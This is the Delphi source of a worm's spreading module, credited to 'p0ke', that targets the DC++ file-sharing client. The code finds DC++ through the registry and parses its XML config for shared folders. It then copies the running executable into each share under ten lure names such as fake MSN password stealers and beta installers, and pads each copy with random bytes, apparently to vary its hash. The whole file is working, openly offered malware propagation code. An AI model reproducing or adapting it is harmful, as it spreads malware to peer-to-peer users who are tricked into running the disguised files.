(* created by p0ke *)

unit dcpp_spreader;

interface

{$DEFINE Stats}

uses
  Windows{$IFDEF Stats}, stats_spreader{$ENDIF};

Var
  CopyName: Array[0..9] Of String = (
            'MSNPasswordStealer_Setup.exe', 'MSNHack.exe', 'AOL_Hack.exe', 'AOL_Password_Stealer.exe', 'mIRC 7.0 Beta.exe',
            'Setup.exe', 'MSNBot_Setup.exe', 'Winamp5.7Beta.exe', 'MSN7Beta.exe', 'ICQ2005.EXE'
            );
  Procedure StartDCPP;
  
implementation

Function GetRegValue(Root: HKey; Path, Value: String): String;
Var
  Key:  HKey;
  Siz:  Cardinal;
  Val:  Array[0..16382] Of Char;
Begin
  Try
  //------------------------------
    ZeroMemory(@Val, SizeOf(Val));
    Siz := 16382;

    RegOpenKeyEx(Root, pChar(Path), 0, REG_SZ, KEY);
    RegQueryValueEx(KEY, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(KEY);

    If (Val <> '') Then
      Result := Val;
  //------------------------------
  Except
    Result := '';
  End;
End;

Function DCExist: Bool;
Begin
  If ( GetRegValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\DC++', 'Install_Dir') <> '') Then
    Result := True
  Else
    Result := False;
End;

Function DCPath: String;
Begin
  Result := '';
  If (DCExist) Then
    Result := GetRegValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\DC++', 'Install_Dir') + '\DCPlusPlus.xml';
End;

Function GetShareDir(FileName: String): String;
Var
  DC    :TextFile;
  Buf1  :String;
  Buf2  :String;
  Data  :String;
Begin
  Try
    AssignFile(DC, FileName);
    Reset(DC);

    Read(DC, Buf1);
    ReadLn(DC, Buf2);
    Data := Buf1;

    While (Not Eof(DC)) Do
    Begin
      Read(DC, Buf1);
      ReadLn(DC, Buf2);
      Data := Data +Buf1;
    End;
    CloseFile(DC);

    Data := Copy(Data, Pos('<Share>', Data) + 7, Length(Data));
    Data := Copy(Data, 1, Pos('</Share', Data)-1);

    Result := '';
    While (Pos('<Directory', Data) > 0) Do
    Begin
      Buf1 := Copy(Data, Pos('<Directory', Data)+11, Length(Data));
      Buf1 := Copy(Buf1, Pos('>', Buf1)+1, Length(Buf1));
      Buf1 := Copy(Buf1, 1, Pos('</Directory>', Buf1)-1);

      Result := Result + Buf1 + #1;
      Data := Copy(Data, Pos('</Directory>', Data)+12, Length(Data));
    End;
  Except
    Result := '';
    Exit;
  End;
End;

Procedure StartDCPP;
Var
  Path  :String;
  Share :String;
  Name  :String;

  I     :Integer;
  J     :Integer;
  R     :Integer;

  Garbage:String;
  F     :TextFile;
Begin
  If (DCExist) Then
  Begin
    Path := GetShareDir(DCPath + '\DCPlusPlus.xml');
    While Pos(#1, Path) > 0 Do
    Begin
      Share := Copy(Path, 1, pos(#1, Path)-1);
      Path  := Copy(Path, pos(#1, Path)+1, length(Path));

      If (Share[Length(Share)] <> '\') Then Share := Share + '\';

      For I := 0 To 9 Do
      Begin
        Name := Share + CopyName[I];
        CopyFile(pChar(ParamStr(0)), pChar(Name), False);

        Try
          Randomize;
          R := (Random(500)+1) * 1024;
          For J := 0 To R Do
            Garbage := Chr(Random(256));

          AssignFile(F, Name);
          Append(F);
          Write(F, Garbage);
          CloseFile(F);

          {$IFDEF Stats} DCPP_Infect := 'y'; {$ENDIF}
        Except
          ;
        End;
      End;
    End;
  End;
End;

end.
